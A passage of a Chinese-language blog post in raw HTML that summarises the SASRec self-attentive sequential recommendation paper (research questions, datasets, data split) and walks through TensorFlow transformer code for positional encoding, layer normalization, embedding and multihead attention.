class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>j</mi></mrow><annotation encoding=\"application/x-tex\">j</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.85396em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.05724em;\">j</span></span></span></span> 的嵌入向量</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msubsup><mi>M</mi><mi>i</mi><mi>j</mi></msubsup></mrow><annotation encoding=\"application/x-tex\">M_i^j</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.219436em;vertical-align:-0.276864em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.942572em;\"><span style=\"top:-2.4231360000000004em;margin-left:-0.10903em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span><span style=\"top:-3.1809080000000005em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.276864em;\"><span></span></span></span></span></span></span></span></span></span> 表示物品<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>i</mi></mrow><annotation encoding=\"application/x-tex\">i</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.65952em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">i</span></span></span></span> 的嵌入向量<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>M</mi><mi>i</mi></msub></mrow><annotation encoding=\"application/x-tex\">M_i</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 和物品<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>j</mi></mrow><annotation encoding=\"application/x-tex\">j</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.85396em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.05724em;\">j</span></span></span></span> 的嵌入向量<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>N</mi><mi>j</mi></msub></mrow><annotation encoding=\"application/x-tex\">N_j</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.969438em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">N</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span></span></span></span> 的内积</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"实验\"><a class=\"anchor\" href=\"#实验\">#</a> 实验</h3>\n<h4 id=\"问题\"><a class=\"anchor\" href=\"#问题\">#</a> 问题</h4>\n<ul>\n<li>SASRec 是否优于最先进的模型（包括基于 CNN/RNN 的方法）？</li>\n<li>SASRec 架构中各个组件的影响是什么？</li>\n<li>SASRec 的训练效率和可扩展性（关于 n）是多少？</li>\n<li>注意力权重是否能够学习与位置或项目属性相关的有意义的模式？</li>\n</ul>\n<h4 id=\"数据集\"><a class=\"anchor\" href=\"#数据集\">#</a> 数据集</h4>\n<ul>\n<li>Amazon：[46] 中引入的一系列数据集，包含从 <span class=\"exturl\" data-url=\"aHR0cDovL0FtYXpvbi5jb20=\">Amazon.com</span> 抓取的大量产品评论语料库。Amazon 上的顶级产品类别被视为单独的数据集。我们考虑两个类别，“美容” 和 “游戏”。该数据集以其高稀疏性和多变性而著称。</li>\n<li>Steam：我们引入了一个从大型在线视频游戏分发平台 Steam 抓取的新数据集。该数据集包含 2,567,538 名用户、15,474 款游戏和 7,793,069 条英文评论，时间跨度为 2010 年 10 月至 2018 年 1 月。 该数据集还包含可能对未来工作有用的丰富信息，例如用户的游戏时间、定价信息、媒体评分、类别、开发者（等）</li>\n<li>MovieLens：一种广泛用于评估协同过滤算法的基准数据集。我们使用包含 100 万用户评分的版本（MovieLens-1M）。</li>\n</ul>\n<p>将评论或评分的存在视为隐式反馈（即用户与商品进行了交互），并使用时间戳来确定操作的顺序。我们丢弃相关操作少于 5 个的用户和商品。为了进行分区，我们将每个用户 u 的历史序列 Su 分成三部分：</p>\n<p |S^u|=\"\">（1）用于测试的最近操作S^u_</p>\n<p |S^u|-1=\"\">（2）用于验证的第二最近操作S^u_</p>\n<p>（3）用于训练的所有剩余操作。请注意，在测试期间，输入序列包含训练操作和验证操作</p>\n<h1 id=\"代码解析\"><a class=\"anchor\" href=\"#代码解析\">#</a> 代码解析</h1>\n<h2 id=\"modulespy\"><a class=\"anchor\" href=\"#modulespy\">#</a> <span class=\"exturl\" data-url=\"aHR0cDovL21vZHVsZXMucHk=\">modules.py</span></h2>\n<p><strong>这个代码实现了 Transformer 模型的一部分，主要包括位置编码、层归一化、嵌入、多头注意力机制和前馈神经网络。</strong></p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\">#/usr/bin/python2</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">June 2017 by kyubyong park. </span></span><br><span class=\"line\"><span class=\"string\">kbpark.linguist@gmail.com.</span></span><br><span class=\"line\"><span class=\"string\">https://www.github.com/kyubyong/transformer</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> __future__ <span class=\"keyword\">import</span> print_function</span><br><span class=\"line\"><span class=\"keyword\">import</span> tensorflow <span class=\"keyword\">as</span> tf</span><br><span class=\"line\"><span class=\"keyword\">import</span> numpy <span class=\"keyword\">as</span> np</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">positional_encoding</span>(<span class=\"params\">dim, sentence_length, dtype=tf.float32</span>):</span><br><span class=\"line\"></span><br><span class=\"line\">    encoded_vec = np.array([pos/np.power(<span class=\"number\">10000</span>, <span class=\"number\">2</span>*i/dim) <span class=\"keyword\">for</span> pos <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(sentence_length) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(dim)])</span><br><span class=\"line\">    encoded_vec[::<span class=\"number\">2</span>] = np.sin(encoded_vec[::<span class=\"number\">2</span>])</span><br><span class=\"line\">    encoded_vec[<span class=\"number\">1</span>::<span class=\"number\">2</span>] = np.cos(encoded_vec[<span class=\"number\">1</span>::<span class=\"number\">2</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> tf.convert_to_tensor(encoded_vec.reshape([sentence_length, dim]), dtype=dtype)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">normalize</span>(<span class=\"params\">inputs, </span></span><br><span class=\"line\"><span class=\"params\">              epsilon = <span class=\"number\">1e-8</span>,</span></span><br><span class=\"line\"><span class=\"params\">              scope=<span class=\"string\">&quot;ln&quot;</span>,</span></span><br><span class=\"line\"><span class=\"params\">              reuse=<span class=\"literal\">None</span></span>):</span><br><span class=\"line\">    <span class=\"string\">&#x27;&#x27;&#x27;Applies layer normalization.</span></span><br><span class=\"line\"><span class=\"string\">    </span></span><br><span class=\"line\"><span class=\"string\">    Args:</span></span><br><span class=\"line\"><span class=\"string\">      inputs: A tensor with 2 or more dimensions, where the first dimension has</span></span><br><span class=\"line\"><span class=\"string\">        `batch_size`.</span></span><br><span class=\"line\"><span class=\"string\">      epsilon: A floating number. A very small number for preventing ZeroDivision Error.</span></span><br><span class=\"line\"><span class=\"string\">      scope: Optional scope for `variable_scope`.</span></span><br><span class=\"line\"><span class=\"string\">      reuse: Boolean, whether to reuse the weights of a previous layer</span></span><br><span class=\"line\"><span class=\"string\">        by the same name.</span></span><br><span class=\"line\"><span class=\"string\">      </span></span><br><span class=\"line\"><span class=\"string\">    Returns:</span></span><br><span class=\"line\"><span class=\"string\">      A tensor with the same shape and data dtype as `inputs`.</span></span><br><span class=\"line\"><span class=\"string\">    &#x27;&#x27;&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">with</span> tf.variable_scope(scope, reuse=reuse):</span><br><span class=\"line\">        inputs_shape = inputs.get_shape()</span><br><span class=\"line\">        params_shape = inputs_shape[-<span class=\"number\">1</span>:]</span><br><span class=\"line\">    </span><br><span class=\"line\">        mean, variance = tf.nn.moments(inputs, [-<span class=\"number\">1</span>], keep_dims=<span class=\"literal\">True</span>)</span><br><span class=\"line\">        beta= tf.Variable(tf.zeros(params_shape))</span><br><span class=\"line\">        gamma = tf.Variable(tf.ones(params_shape))</span><br><span class=\"line\">        normalized = (inputs - mean) / ( (variance + epsilon) ** (<span class=\"number\">.5</span>) )</span><br><span class=\"line\">        outputs = gamma * normalized + beta</span><br><span class=\"line\">        </span><br><span class=\"line\">    <span class=\"keyword\">return</span> outputs</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">embedding</span>(<span class=\"params\">inputs, </span></span><br><span class=\"line\"><span class=\"params\">              vocab_size, </span></span><br><span class=\"line\"><span class=\"params\">              num_units, </span></span><br><span class=\"line\"><span class=\"params\">              zero_pad=<span class=\"literal\">True</span>, </span></span><br><span class=\"line\"><span class=\"params\">              scale=<span class=\"literal\">True</span>,</span></span><br><span class=\"line\"><span class=\"params\">              l2_reg=<span class=\"number\">0.0</span>,</span></span><br><span class=\"line\"><span class=\"params\">              scope=<span class=\"string\">&quot;embedding&quot;</span>, </span></span><br><span class=\"line\"><span class=\"params\">              with_t=<span class=\"literal\">False</span>,</span></span><br><span class=\"line\"><span class=\"params\">              reuse=<span class=\"literal\">None</span></span>):</span><br><span class=\"line\">    <span class=\"string\">&#x27;&#x27;&#x27;Embeds a given tensor.</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    Args:</span></span><br><span class=\"line\"><span class=\"string\">      inputs: A `Tensor` with type `int32` or `int64` containing the ids</span></span><br><span class=\"line\"><span class=\"string\">         to be looked up in `lookup table`.</span></span><br><span class=\"line\"><span class=\"string\">      vocab_size: An int. Vocabulary size.</span></span><br><span class=\"line\"><span class=\"string\">      num_units: An int. Number of embedding hidden units.</span></span><br><span class=\"line\"><span class=\"string\">      zero_pad: A boolean. If True, all the values of the fist row (id 0)</span></span><br><span class=\"line\"><span class=\"string\">        should be constant zeros.</span></span><br><span class=\"line\"><span class=\"string\">      scale: A boolean. If True. the outputs is multiplied by sqrt num_units.</span></span><br><span class=\"line\"><span class=\"string\">      scope: Optional scope for `variable_scope`.</span></span><br><span class=\"line\"><span class=\"string\">      reuse: Boolean, whether to reuse the weights of a previous layer</span></span><br><span class=\"line\"><span class=\"string\">        by the same name.</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    Returns:</span></span><br><span class=\"line\"><span class=\"string\">      A `Tensor` with one more rank than inputs&#x27;s. The last dimensionality</span></span><br><span class=\"line\"><span class=\"string\">        should be `num_units`.</span></span><br><span class=\"line\"><span class=\"string\">        </span></span><br><span class=\"line\"><span class=\"string\">    For example,</span></span><br><span class=\"line\"><span class=\"string\">    </span></span><br></pre></td></tr></table></figure><br />\nimport tensorflow as tf</p>\n<pre><code>inputs = tf.to_int32(tf.reshape(tf.range(2*3), (2, 3)))\noutputs = embedding(inputs, 6, 2, zero_pad=True)\nwith tf.Session() as sess:\n    sess.run(tf.global_variables_initializer())\n    print sess.run(outputs)\n&gt;&gt;\n[[[ 0.          0.        ]\n  [ 0.09754146  0.67385566]\n  [ 0.37864095 -0.35689294]]\n\n [[-1.01329422 -1.09939694]\n  [ 0.7521342   0.38203377]\n  [-0.04973143 -0.06210355]]]\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">    </span><br></pre></td></tr></table></figure>\nimport tensorflow as tf\n\ninputs = tf.to_int32(tf.reshape(tf.range(2*3), (2, 3)))\noutputs = embedding(inputs, 6, 2, zero_pad=False)\nwith tf.Session() as sess:\n    sess.run(tf.global_variables_initializer())\n    print sess.run(outputs)\n&gt;&gt;\n[[[-0.19172323 -0.39159766]\n  [-0.43212751 -0.66207761]\n  [ 1.03452027 -0.26704335]]\n\n [[-0.11634696 -0.35983452]\n  [ 0.50208133  0.53509563]\n  [ 1.22204471 -0.96587461]]]    \n<figure class=\"highlight jboss-cli\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">    &#x27;&#x27;&#x27;</span><br><span class=\"line\">    with tf.variable_scope<span class=\"params\">(scope, <span class=\"attr\">reuse</span>=reuse)</span>:</span><br><span class=\"line\">        lookup_table = tf.get_variable<span class=\"params\">(&#x27;lookup_table&#x27;,</span></span><br><span class=\"line\"><span class=\"params\">                                       <span class=\"attr\">dtype</span>=tf.float32,</span></span><br><span class=\"line\"><span class=\"params\">                                       <span class=\"attr\">shape</span>=[vocab_size, num_units],</span></span><br><span class=\"line\"><span class=\"params\">                                       #<span class=\"attr\">initializer</span>=tf.contrib.layers.xavier_initializer()</span>,</span><br><span class=\"line\">                                       regularizer=tf.contrib.layers.l2_regularizer<span class=\"params\">(l2_reg)</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> zero_pad:</span><br><span class=\"line\">            lookup_table = tf.concat<span class=\"params\">((tf.zeros(<span class=\"attr\">shape</span>=[1, num_units])</span>,</span><br><span class=\"line\">                                      lookup_table[1:, :]), 0)</span><br><span class=\"line\">        outputs = tf.nn.embedding_lookup<span class=\"params\">(lookup_table, inputs)</span></span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">if</span> scale:</span><br><span class=\"line\">            outputs = outputs * <span class=\"params\">(num_units ** 0.5)</span> </span><br><span class=\"line\">    <span class=\"keyword\">if</span> with_t: return outputs,lookup_table</span><br><span class=\"line\">    else: return outputs</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def multihead_attention<span class=\"params\">(queries, </span></span><br><span class=\"line\"><span class=\"params\">                        keys, </span></span><br><span class=\"line\"><span class=\"params\">                        <span class=\"attr\">num_units</span>=None, </span></span><br><span class=\"line\"><span class=\"params\">                        <span class=\"attr\">num_heads</span>=8, </span></span><br><span class=\"line\"><span class=\"params\">                        <span class=\"attr\">dropout_rate</span>=0,</span></span><br><span class=\"line\"><span class=\"params\">                        <span class=\"attr\">is_training</span>=True,</span></span><br><span class=\"line\"><span class=\"params\">                        <span class=\"attr\">causality</span>=False,</span></span><br><span class=\"line\"><span class=\"params\">                        <span class=\"attr\">scope</span>=&quot;multihead_attention&quot;, </span></span><br><span class=\"line\"><span class=\"params\">                        <span class=\"attr\">reuse</span>=None,</span></span><br><span class=\"line\"><span class=\"params\">                        <span class=\"attr\">with_qk</span>=False)</span>:</span><br><span class=\"line\">    &#x27;&#x27;&#x27;Applies multihead attention.</span><br><span class=\"line\">    </span><br><span class=\"line\">    Args:</span><br><span class=\"line\">      queries: A 3d tensor with shape of [N, T_q, C_q].</span><br><span class=\"line\">      keys: A 3d tensor with shape of [N, T_k, C_k].</span><br><span class=\"line\">      num_units: A scalar. Attention size.</span><br><span class=\"line\">      dropout_rate: A floating point number.</span><br><span class=\"line\">      is_training: Boolean. Controller of mechanism for dropout.</span><br><span class=\"line\">      causality: Boolean. If <span class=\"literal\">true</span>, units that reference the future are masked. </span><br><span class=\"line\">      num_heads: An int. Number of heads.</span><br><span class=\"line\">      scope: Optional scope for `variable_scope`.</span><br><span class=\"line\">      reuse: Boolean, whether to reuse the weights of a previous layer</span><br><span class=\"line\">        by the same name.</span><br><span class=\"line\">        </span><br><span class=\"line\">    Returns</span><br><span class=\"line\">      A 3d tensor with shape of <span class=\"params\">(N, T_q, C)</span>  </span><br><span class=\"line\">    &#x27;&#x27;&#x27;</span><br><span class=\"line\">    with tf.variable_scope<span class=\"params\">(scope, <span class=\"attr\">reuse</span>=reuse)</span>:</span><br><span class=\"line\">        <span class=\"comment\"># Set the fall back option for num_units</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> num_units is None:</span><br><span class=\"line\">            num_units = queries.get_shape<span class=\"params\">()</span><span class=\"string\">.as_list</span>[-1]</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># Linear projections</span></span><br><span class=\"line\">        <span class=\"comment\"># Q = tf.layers.dense(queries, num_units, activation=tf.nn.relu) # (N, T_q, C)</span></span><br><span class=\"line\">        <span class=\"comment\"># K = tf.layers.dense(keys, num_units, activation=tf.nn.relu) # (N, T_k, C)</span></span><br><span class=\"line\">        <span class=\"comment\"># V = tf.layers.dense(keys, num_units, activation=tf.nn.relu) # (N, T_k, C)</span></span><br><span class=\"line\">        Q = tf.layers.dense<span class=\"params\">(queries, num_units, <span class=\"attr\">activation</span>=None)</span> <span class=\"comment\"># (N, T_q, C)</span></span><br><span class=\"line\">        K = tf.layers.dense<span class=\"params\">(keys, num_units, <span class=\"attr\">activation</span>=None)</span> <span class=\"comment\"># (N, T_k, C)</span></span><br><span class=\"line\">        V = tf.layers.dense<span class=\"params\">(keys, num_units, <span class=\"attr\">activation</span>=None)</span> <span class=\"comment\"># (N, T_k, C)</span></span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># Split and concat</span></span><br><span class=\"line\">        Q_ = tf.concat<span class=\"params\">(tf.split(Q, num_heads, <span class=\"attr\">axis</span>=2)</span>, axis=0) <span class=\"comment\"># (h*N, T_q, C/h) </span></span><br><span class=\"line\">        K_ = tf.concat<span class=\"params\">(tf.split(K, num_heads, <span class=\"attr\">axis</span>=2)</span>, axis=0) <span class=\"comment\"># (h*N, T_k, C/h) </span></span><br><span class=\"line\">        V_ = tf.concat<span class=\"params\">(tf.split(V, num_heads, <span class=\"attr\">axis</span>=2)</span>, axis=0) <span class=\"comment\"># (h*N, T_k, C/h) </span></span><br><span class=\"line\">    </span><br><span class=\"line\">        <span class=\"comment\"># Multiplication</span></span><br><span class=\"line\">        outputs = tf.matmul<span class=\"params\">(Q_, tf.transpose(K_, [0, 2, 1])</span>) <span class=\"comment\"># (h*N, T_q, T_k)</span></span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># Scale</span></span><br><span class=\"line\">        outputs = outputs / <span class=\"params\">(K_.get_shape()</span><span class=\"string\">.as_list</span><span class=\"params\">()</span>[-1] ** 0.5)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># Key Masking</span></span><br><span class=\"line\">        key_masks = tf.sign<span class=\"params\">(tf.reduce_sum(tf.abs(keys)</span>, axis=-1)) <span class=\"comment\"># (N, T_k)</span></span><br><span class=\"line\">        key_masks = tf.tile<span class=\"params\">(key_masks, [num_heads, 1])</span> <span class=\"comment\"># (h*N, T_k)</span></span><br><span class=\"line\">        key_masks = tf.tile<span class=\"params\">(tf.expand_dims(key_masks, 1)</span>, [1, tf.shape<span class=\"params\">(queries)</span>[1], 1]) <span class=\"comment\"># (h*N, T_q, T_k)</span></span><br><span class=\"line\">        </span><br><span class=\"line\">        paddings = tf.ones_like<span class=\"params\">(outputs)</span>*<span class=\"params\">(-2**32+1)</span></span><br><span class=\"line\">        outputs = tf.where<span class=\"params\">(tf.equal(key_masks, 0)</span>, paddings, outputs) <span class=\"comment\"># (h*N, T_q, T_k)</span></span><br><span class=\"line\">      </span><br><span class=\"line\">        <span class=\"comment\"># Causality = Future blinding</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> causality:</span><br><span class=\"line\">            diag_vals = tf.ones_like<span class=\"params\">(outputs[0, :, :])</span> <span class=\"comment\"># (T_q, T_k)</span></span><br><span class=\"line\">            tril = tf.linalg.LinearOperatorLowerTriangular<span class=\"params\">(diag_vals)</span><span class=\"string\">.to_dense</span><span class=\"params\">()</span> <span class=\"comment\"># (T_q, T_k)</span></span><br><span class=\"line\">            masks = tf.tile<span class=\"params\">(tf.expand_dims(tril, 0)</span>, [tf.shape<span class=\"params\">(outputs)</span>[0], 1, 1]) <span class=\"comment\"># (h*N, T_q, T_k)</span></span><br><span class=\"line\">       </span><br><span class=\"line\">            paddings = tf.ones_like<span class=\"params\">(masks)</span>*<span class=\"params\">(-2**32+1)</span></span><br><span class=\"line\">            outputs = tf.where<span class=\"params\">(tf.equal(masks, 0)</span>, paddings, outputs) <span class=\"comment\"># (h*N, T_q, T_k)</span></span><br><span class=\"line\">      </span><br><span class=\"line\">        <span class=\"comment\"># Activation</span></span><br><span class=\"line\">        outputs = tf.nn.softmax<span class=\"params\">(outputs)</span> <span class=\"comment\"># (h*N, T_q, T_k)</span></span><br><span class=\"line\">         </span><br><span class=\"line\">        <span class=\"comment\"># Query Masking</span></span><br><span class=\"line\">        query_masks = tf.sign<span class=\"params\">(tf.reduce_sum(tf.abs(queries)</span>, axis=-1)) <span class=\"comment\"># (N, T_q)</span></span><br><span class=\"line\">        query_masks = tf.tile<span class=\"params\">(query_masks, [num_heads, 1])</span> <span class=\"comment\"># (h*N, T_q)</span></span><br><span class=\"line\">        query_masks = 